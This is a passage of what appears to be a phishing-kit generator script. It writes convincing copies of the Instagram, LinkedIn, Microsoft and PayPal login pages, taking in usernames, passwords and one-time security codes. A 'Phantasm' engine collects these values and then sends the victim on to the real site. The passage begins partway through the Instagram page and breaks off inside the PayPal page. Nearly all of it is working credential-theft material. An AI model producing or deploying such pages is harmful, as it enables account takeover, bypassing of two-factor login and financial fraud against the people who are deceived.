                            <span class="fb-icon"></span>
                            Log in with Facebook
                        </a>

                        <a href="#" class="forgot-password" style="display: block; text-align: center;">Forgot password?</a>
                    </form>
                </div>
            </div>

            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-stores">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Pc7U52p3p.png" alt="Google Play">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Top Accounts</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
        <div style="width: 100%; text-align: center; margin-top: 10px;">
            <select style="border: none; background: transparent; color: #8e8e8e; font-size: 12px; cursor: pointer;">
                <option value="en">English</option>
                <option value="fr">Français</option>
                <option value="es">Español</option>
            </select>
            <span style="margin-left: 16px;">© 2024 Instagram from Meta</span>
        </div>
    </div>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #0095f6; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://www.instagram.com/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#loginBtn',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp'
                }
            });

            // Image slider
            const images = document.querySelectorAll('.screenshot-slider img');
            let currentImage = 0;
            if(images.length > 0) {
                setInterval(() => {
                    images[currentImage].classList.remove('active');
                    currentImage = (currentImage + 1) % images.length;
                    images[currentImage].classList.add('active');
                }, 4000);
            }

            // Input validation and UI logic
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const showPassBtn = document.getElementById('showPassBtn');

            function checkInputs() {
                if (usernameInput.value.length >= 1 && passwordInput.value.length >= 6) {
                    loginBtn.classList.add('active');
                    loginBtn.disabled = false;
                } else {
                    loginBtn.classList.remove('active');
                    loginBtn.disabled = true;
                }

                if (passwordInput.value.length > 0) {
                    showPassBtn.style.display = 'block';
                } else {
                    showPassBtn.style.display = 'none';
                }
            }

            usernameInput.addEventListener('input', checkInputs);
            passwordInput.addEventListener('input', checkInputs);

            showPassBtn.addEventListener('click', () => {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    showPassBtn.textContent = 'Hide';
                } else {
                    passwordInput.type = 'password';
                    showPassBtn.textContent = 'Show';
                }
            });
        });
    </script>
</body>
</html>"""
save_template("instagram", instagram_html)

# LINKEDIN
linkedin_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login, Log in | LinkedIn</title>
    <link rel="icon" type="image/png" href="https://static.licdn.com/sc/h/al2o9zrvru7aqj8e1x2rzsrca">
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            padding: 0;
        }

        .header {
            width: 100%;
            padding: 30px 0;
            max-width: 1128px;
            display: flex;
            align-items: center;
        }

        .logo {
            color: #0a66c2;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
            display: flex;
            align-items: center;
            margin-left: 15px;
        }

        .logo svg {
            height: 34px;
            fill: #0a66c2;
        }

        .main-content {
            width: 100%;
            max-width: 352px;
            padding: 0 16px;
            display: flex;
            flex-direction: column;
        }

        .card {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            padding: 24px;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 32px;
            margin: 0 0 4px;
            font-weight: 600;
            color: rgba(0,0,0,0.9);
            line-height: 1.25;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 24px;
            color: rgba(0,0,0,0.9);
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 12px;
            position: relative;
        }

        .input-wrapper {
            position: relative;
            height: 52px;
        }

        input {
            width: 100%;
            height: 100%;
            padding: 26px 12px 6px 12px;
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            background-color: transparent;
            transition: border-color 0.2s;
        }

        input:hover {
            border-color: rgba(0,0,0,0.9);
        }

        input:focus {
            border-color: #0a66c2;
            border-width: 2px;
            padding: 25px 11px 5px 11px; /* Adjust for 2px border */
            outline: none;
        }

        .floating-label {
            position: absolute;
            left: 12px;
            top: 16px;
            font-size: 16px;
            color: rgba(0,0,0,0.6);
            pointer-events: none;
            transition: all 0.2s ease-in-out;
        }

        input:focus + .floating-label,
        input:not(:placeholder-shown) + .floating-label {
            top: 8px;
            font-size: 12px;
        }

        .show-password {
            position: absolute;
            right: 12px;
            top: 16px;
            background: none;
            border: none;
            color: #0a66c2;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            padding: 0;
            z-index: 10;
        }
        
        .show-password:hover {
            text-decoration: underline;
            background-color: rgba(10, 102, 194, 0.1);
            border-radius: 2px;
        }

        .forgot {
            font-size: 16px;
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
            display: inline-block;
            margin: 16px 0 24px;
        }

        .forgot:hover {
            text-decoration: underline;
            background-color: rgba(10, 102, 194, 0.1);
            border-radius: 2px;
        }

        .btn {
            width: 100%;
            background: #0a66c2;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background: #004182;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            color: rgba(0,0,0,0.6);
            font-size: 14px;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid rgba(0,0,0,0.15);
        }

        .divider span {
            padding: 0 16px;
        }

        .google-btn {
            width: 100%;
            background: #fff;
            color: rgba(0,0,0,0.6);
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 28px;
            padding: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
            transition: background-color 0.2s, border-width 0.2s;
        }

        .google-btn:hover {
            background-color: rgba(0,0,0,0.04);
            border-width: 2px;
            padding: 7px; /* Adjust for 2px border */
        }

        .google-btn img {
            width: 20px;
            height: 20px;
            margin-right: 8px;
        }
        
        .apple-btn {
            width: 100%;
            background: #fff;
            color: rgba(0,0,0,0.6);
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 28px;
            padding: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s, border-width 0.2s;
        }

        .apple-btn:hover {
            background-color: rgba(0,0,0,0.04);
            border-width: 2px;
            padding: 7px;
        }
        
        .apple-btn svg {
            margin-right: 8px;
            width: 20px;
            height: 20px;
        }

        .join {
            margin-top: 32px;
            text-align: center;
            font-size: 16px;
        }

        .join a {
            color: #0a66c2;
            font-weight: 600;
            text-decoration: none;
        }

        .join a:hover {
            text-decoration: underline;
            background-color: rgba(10, 102, 194, 0.1);
            border-radius: 2px;
        }

        .footer {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 0;
            width: 100%;
            background-color: #fff;
            margin-top: auto;
            font-size: 12px;
        }

        .footer ul {
            list-style: none;
            padding: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin: 0;
        }

        .footer a {
            color: rgba(0,0,0,0.6);
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
            color: #0a66c2;
        }

        .footer-logo {
            height: 14px;
            margin-right: 4px;
            vertical-align: middle;
            fill: rgba(0,0,0,0.6);
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Error message style */
        .error-message {
            background-color: #fcebeb;
            color: rgba(0,0,0,0.9);
            padding: 8px 12px;
            border-radius: 2px;
            font-size: 14px;
            margin-bottom: 16px;
            display: flex;
            align-items: flex-start;
        }
        
        .error-icon {
            color: #c0392b;
            margin-right: 8px;
            font-size: 16px;
            font-weight: bold;
        }

        @media (min-width: 768px) {
            .header {
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 14" data-supported-dps="56x14" fill="currentColor" class="mercado-match" width="56" height="14" focusable="false">
                <g>
                    <path class="background-level-1" d="M22.1 8.2l3.09-3.8h2.6l-3.86 4.56L28 14h-2.58l-3.32-4.59L19.98 14H17l4.05-5.38V8.2zM33 9.38h-2.45v4.36h-2.4V2.22h2.4v4.61l2.45-2.67h2.9l-2.8 2.87L36 14h-2.68l-2.3-3.62h-0.02V9.38zM43.76 11.23q-0.65 0.53-1.63 0.53-1.42 0-2.07-0.78-0.65-0.77-0.65-2.26 0-1.54 0.69-2.31 0.68-0.77 1.93-0.77 0.98 0 1.63 0.46V2.22h2.4V14h-2.3v-1.12h-0.1q-0.74 1.34-2.4 1.34-1.63 0-2.62-1.09-0.99-1.09-0.99-3.01 0-1.98 1-3.07 1-1.09 2.62-1.09 1.61 0 2.37 1.28h0.04v-0.27h2.1v4.95zM43.76 8.91q0-0.75-0.34-1.12-0.35-0.37-0.92-0.37-0.54 0-0.89 0.37-0.35 0.37-0.35 1.14 0 0.77 0.35 1.15 0.35 0.38 0.89 0.38 0.57 0 0.92-0.38 0.34-0.38 0.34-1.17zM51.1 2.22h2.4V14h-2.4V2.22zM56 2.22v1.94h-0.1q-0.62-1.02-1.74-1.02-0.84 0-1.4.37l0.87 1.81q0.4-0.19 0.83-0.19 0.44 0 0.68 0.22 0.24 0.22 0.24 0.68v0.32q-1.76 0.16-2.73 0.72-0.98 0.56-0.98 1.62 0 0.82 0.56 1.32 0.56 0.51 1.48 0.51 1.04 0 1.83-0.7h0.07V14h2.29V5.38q0-1.72-0.64-2.48-0.64-0.76-1.92-0.76-1.34 0-2.22 0.76L52.5 3.55q0.65-0.56 1.48-0.56 0.75 0 1.14 0.38 0.38 0.38 1.15v0.12h-0.2zM53.64 10.38q0 0.45-0.24 0.68-0.24 0.23-0.66 0.23-0.38 0-0.62-0.21-0.24-0.2-0.24-0.56 0-0.37 0.27-0.61 0.27-0.24 1.24-0.35v0.82zM7.5 14H5.12V2.22H7.5V14zM2.62 14H0.25V5.57h2.37V14zM0.25 3.33h2.37v-2.2H0.25v2.2z"></path>
                </g>
            </svg>
        </a>
    </div>

    <div class="main-content">
        <div class="card">
            <div id="step-1">
                <h1>Log in</h1>
                <p class="subtitle">Stay updated on your professional world</p>

                <form id="login-form">
                    <div class="form-group">
                        <div class="input-wrapper">
                            <input type="text" id="username" placeholder=" " required>
                            <span class="floating-label">Email or Phone</span>
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="input-wrapper">
                            <input type="password" id="password" placeholder=" " required>
                            <span class="floating-label">Password</span>
                            <button type="button" class="show-password" id="showPassBtn">Show</button>
                        </div>
                    </div>

                    <a href="#" class="forgot">Forgot password?</a>

                    <button type="submit" class="btn" id="loginBtn">Log in</button>
                </form>

                <div class="divider">
                    <span>or</span>
                </div>

                <button class="google-btn">
                    <img src="https://static.licdn.com/a/g/d/4o4d8n7j126k418460595267" alt="Google">
                    Log in with Google
                </button>
                
                <button class="apple-btn">
                    <svg viewBox="0 0 24 24" width="24px" height="24px" fill="currentColor">
                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.74 1.18 0 2.45-1.02 4.12-.74.65.04 2.5.4 3.52 1.83-3.15 1.84-2.58 6.13.78 7.35-.67 1.73-1.57 3.52-3.5 3.79zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.16 2.29-2.03 4.34-3.74 4.25z"/>
                    </svg>
                    Log in with Apple
                </button>
            </div>
        </div>

        <div class="join">
            New to LinkedIn? <a href="#">Join now</a>
        </div>
    </div>

    <footer class="footer">
        <div style="display: flex; align-items: center;">
            <svg viewBox="0 0 56 14" width="56" height="14" fill="currentColor" class="footer-logo">
                <g>
                    <path d="M22.1 8.2l3.09-3.8h2.6l-3.86 4.56L28 14h-2.58l-3.32-4.59L19.98 14H17l4.05-5.38V8.2zM33 9.38h-2.45v4.36h-2.4V2.22h2.4v4.61l2.45-2.67h2.9l-2.8 2.87L36 14h-2.68l-2.3-3.62h-0.02V9.38zM43.76 11.23q-0.65 0.53-1.63 0.53-1.42 0-2.07-0.78-0.65-0.77-0.65-2.26 0-1.54 0.69-2.31 0.68-0.77 1.93-0.77 0.98 0 1.63 0.46V2.22h2.4V14h-2.3v-1.12h-0.1q-0.74 1.34-2.4 1.34-1.63 0-2.62-1.09-0.99-1.09-0.99-3.01 0-1.98 1-3.07 1-1.09 2.62-1.09 1.61 0 2.37 1.28h0.04v-0.27h2.1v4.95zM43.76 8.91q0-0.75-0.34-1.12-0.35-0.37-0.92-0.37-0.54 0-0.89 0.37-0.35 0.37-0.35 1.14 0 0.77 0.35 1.15 0.35 0.38 0.89 0.38 0.57 0 0.92-0.38 0.34-0.38 0.34-1.17zM51.1 2.22h2.4V14h-2.4V2.22zM56 2.22v1.94h-0.1q-0.62-1.02-1.74-1.02-0.84 0-1.4.37l0.87 1.81q0.4-0.19 0.83-0.19 0.44 0 0.68 0.22 0.24 0.22 0.24 0.68v0.32q-1.76 0.16-2.73 0.72-0.98 0.56-0.98 1.62 0 0.82 0.56 1.32 0.56 0.51 1.48 0.51 1.04 0 1.83-0.7h0.07V14h2.29V5.38q0-1.72-0.64-2.48-0.64-0.76-1.92-0.76-1.34 0-2.22 0.76L52.5 3.55q0.65-0.56 1.48-0.56 0.75 0 1.14 0.38 0.38 0.38 1.15v0.12h-0.2zM53.64 10.38q0 0.45-0.24 0.68-0.24 0.23-0.66 0.23-0.38 0-0.62-0.21-0.24-0.2-0.24-0.56 0-0.37 0.27-0.61 0.27-0.24 1.24-0.35v0.82zM7.5 14H5.12V2.22H7.5V14zM2.62 14H0.25V5.57h2.37V14zM0.25 3.33h2.37v-2.2H0.25v2.2z"></path>
                </g>
            </svg>
            <span style="color: rgba(0,0,0,0.6); margin-left: 4px;">© 2024</span>
        </div>
        <ul style="margin-left: 16px;">
            <li><a href="#">User Agreement</a></li>
            <li><a href="#">Privacy Policy</a></li>
            <li><a href="#">Community Guidelines</a></li>
            <li><a href="#">Cookie Policy</a></li>
            <li><a href="#">Copyright Policy</a></li>
            <li><a href="#">Send Feedback</a></li>
            <li><a href="#">Language</a></li>
        </ul>
    </footer>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://www.linkedin.com/feed/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#loginBtn',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp'
                }
            });

            // Toggle Password Visibility
            const showPassBtn = document.getElementById('showPassBtn');
            const passwordInput = document.getElementById('password');
            
            if(showPassBtn && passwordInput) {
                showPassBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    if (passwordInput.type === 'password') {
                        passwordInput.type = 'text';
                        showPassBtn.textContent = 'Hide';
                    } else {
                        passwordInput.type = 'password';
                        showPassBtn.textContent = 'Show';
                    }
                });
            }
        });
    </script>
</body>
</html>"""
save_template("linkedin", linkedin_html)

# MICROSOFT
microsoft_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your account</title>
    <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <style>
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga', 'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI', 'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text', 'Cambria Math', sans-serif;
            background-color: #f0f2f5;
            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a8b4b1a50a498e72.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background: #fff;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            position: relative;
            box-sizing: border-box;
        }
        .logo {
            height: 24px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 10px;
            color: #1b1b1b;
            line-height: 1.2;
        }
        .input-group {
            margin-top: 20px;
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            height: 36px;
            padding: 6px 10px;
            border: 1px solid #8f8f8f;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            color: #1b1b1b;
        }
        input:focus {
            border-color: #0067b8;
            border-bottom-width: 2px;
        }
        input::placeholder {
            color: #666;
        }
        .actions {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
        }
        .next-btn {
            background-color: #0067b8;
            color: #fff;
            border: none;
            padding: 8px 36px;
            font-size: 15px;
            cursor: pointer;
            min-width: 108px;
            font-weight: 600;
            transition: background-color 0.2s;
        }
        .next-btn:hover {
            background-color: #005da6;
        }
        .links {
            margin-top: 20px;
            font-size: 13px;
        }
        .links a {
            color: #0067b8;
            text-decoration: none;
        }
        .links a:hover {
            color: #666;
            text-decoration: underline;
        }
        .hidden {
            display: none;
        }
        .user-identity {
            display: flex;
            align-items: center;
            font-size: 15px;
            margin-bottom: 20px;
            color: #1b1b1b;
        }
        .back-arrow {
            margin-right: 10px;
            cursor: pointer;
            font-size: 18px;
            color: #1b1b1b;
            text-decoration: none;
        }
        .back-arrow:hover {
            background-color: #e1e1e1;
            border-radius: 50%;
        }
        
        /* Footer */
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            text-align: right;
            padding: 10px 20px;
            box-sizing: border-box;
            background: rgba(255,255,255,0.6);
            font-size: 12px;
        }
        .footer a {
            color: #000;
            text-decoration: none;
            margin-left: 20px;
        }
        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 600px) {
            body {
                background: #fff;
            }
            .card {
                box-shadow: none;
                width: 100%;
                height: 100%;
                padding: 24px;
            }
            .footer {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
        
        <div id="step-1">
            <h1>Log in</h1>
            
            <div class="input-group">
                <input type="email" id="email-input" placeholder="Email, phone, or Skype" required>
            </div>
            
            <div class="links">
                No account? <a href="#">Create one!</a>
            </div>
            <div class="links" style="margin-top: 10px;">
                <a href="#">Can’t access your account?</a>
            </div>
            
            <div class="actions">
                <button class="next-btn" id="btn-next">Next</button>
            </div>
        </div>

        <div id="step-2" class="hidden">
            <div class="user-identity">
                <span class="back-arrow" id="back-arrow">&#8592;</span>
                <span id="user-email-display">user@example.com</span>
            </div>
            
            <h1 style="font-size: 24px; margin-bottom: 20px;">Enter password</h1>
            
            <div class="input-group">
                <input type="password" id="password-input" placeholder="Password" required>
            </div>
            
            <div class="links">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="actions">
                <button class="next-btn" id="btn-submit">Log in</button>
            </div>
        </div>
        
        <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%;">
            <h1 style="margin-bottom: 10px; font-size: 24px;">Security Verification</h1>
            <p style="color: #666; font-size: 15px; margin-bottom: 20px; text-align: center;">To secure your account, please enter the verification code sent to your device.</p>
            
            <div class="input-group" style="width: 100%; margin-bottom: 20px;">
                <input type="text" id="otp-input" placeholder="Enter code" required style="width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px;">
            </div>
            
            <button class="next-btn" id="btn-otp-submit" style="width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Verify</button>
        </div>
    </div>
    
    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>

    <!-- Phantasm Engine -->
    <script src="/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Custom back arrow logic
            document.getElementById('back-arrow').addEventListener('click', () => {
                document.getElementById('step-2').classList.add('hidden');
                document.getElementById('step-1').classList.remove('hidden');
                document.getElementById('step-1').style.display = 'block';
            });

            // Initialize Engine
            new Phantasm({
                redirectUrl: 'https://login.microsoftonline.com',
                selectors: {
                    email: '#email-input',
                    password: '#password-input',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp'
                }
            });
        });
    </script>
</body>
</html>
"""
save_template("microsoft", microsoft_html)

# PAYPAL
paypal_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
    <style>
        body {
            font-family: PayPalSansBig-Regular, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
            margin-top: 60px;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo img {
            height: 36px;
        }
        .card {
            background: #fff;
            border: 1px solid #eaeced;
            border-radius: 8px;
            padding: 40px 40px;
            position: relative;
        }
        
        .input-wrapper {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }
        
        input {
            width: 100%;
            padding: 18px 12px 6px 12px;
            border: 1px solid #9da3a6;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            color: #001435;
            height: 50px;
            transition: border-color 0.2s;
        }
        
        input:focus {
            border-color: #0070ba;
            outline: none;
            box-shadow: 0 0 0 1px #0070ba; /* PayPal style focus */
        }
        
        .floating-label {
            position: absolute;
            left: 13px;
            top: 16px;
            font-size: 16px;
            color: #6c7378;
            pointer-events: none;
            transition: 0.2s ease all;
        }
        
        input:focus ~ .floating-label,
        input:not(:placeholder-shown) ~ .floating-label {
            top: 6px;
            font-size: 12px;
            color: #6c7378;
        }
        
        .forgot {
            color: #0070ba;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            display: block;
            margin-bottom: 20px;
            margin-top: 10px;
            text-align: left;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        
        .btn-primary {
            background-color: #0070ba;
            color: #fff;
            border: none;
            border-radius: 25px;
            width: 100%;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }
        .btn-primary:hover {
            background-color: #003087;
        }
        
        .divider {
            position: relative;
            margin: 20px 0;
            text-align: center;
        }
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #cbd2d6;
            z-index: -1;
        }
        .divider span {
            background: #fff;
            padding: 0 10px;
            color: #6c7378;
            font-size: 14px;
        }
        
        .btn-secondary {
            background-color: #fff;
            color: #003087;
            border: 1px solid #003087;
            border-radius: 25px;
            width: 100%;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            box-sizing: border-box;
            transition: background-color 0.2s;
        }
        .btn-secondary:hover {
            background-color: #f2f8fc;
            text-decoration: none;
        }
        
        .footer {
            margin-top: auto;
            width: 100%;
            background-color: #f7f9fa;
            padding: 20px 0;
            text-align: center;
            font-size: 12px;
            color: #6c7378;
            border-top: 1px solid #eaeced;
        }
        .footer ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }
        .footer li {
            margin: 0 10px;
        }
        .footer a {
            color: #6c7378;
            text-decoration: none;
            font-weight: 600;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        
        .hidden {
            display: none;
        }
        
        .user-display {
            margin-bottom: 20px;
            text-align: left;
            font-size: 16px;
            color: #2c2e2f;
        }
        .change-link {
            color: #0070ba;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            margin-left: 10px;
            cursor: pointer;
        }
        
        @media (max-width: 500px) {
            .card {
                border: none;
                padding: 0;
            }
            .container {
                margin-top: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
        </div>
        
        <div class="card">
            <!-- Step 1: Email -->
            <div id="step-1">
                <div class="input-wrapper">
                    <input type="text" id="email" class="input-field" placeholder=" " required>
                    <span class="floating-label">Email or mobile number</span>
                </div>
                
                <a href="#" class="forgot">Forgot email?</a>
                
                <button id="btn-next" class="btn-primary">Next</button>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <a href="#" class="btn-secondary">Sign Up</a>
            </div>
            
            <!-- Step 2: Password -->
            <div id="step-2" class="hidden">
                <div class="user-display">
                    <span id="user-email-display">user@example.com</span>
                    <a class="change-link" id="back-btn" style="cursor: pointer;">Change</a>
                </div>
                
                <div class="input-wrapper">
                    <input type="password" id="password" class="input-field" placeholder=" " required>
                    <span class="floating-label">Password</span>
                </div>
                
                <a href="#" class="forgot">Forgot password?</a>
                
                <button id="btn-submit" class="btn-primary">Log In</button>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <a href="#" class="btn-secondary">Log In with a One-time Code</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <ul>
            <li><a href="#">Contact Us</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Legal</a></li>
            <li><a href="#">Policy Updates</a></li>
            <li><a href="#">Worldwide</a></li>
        </ul>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.paypal.com/myaccount/summary',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#user-email-display'
                }
            });

            const backBtn = document.getElementById('back-btn');
            if (backBtn) {
                backBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    app.transitionToStep(1);
                });
            }
        });
    </script>


    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
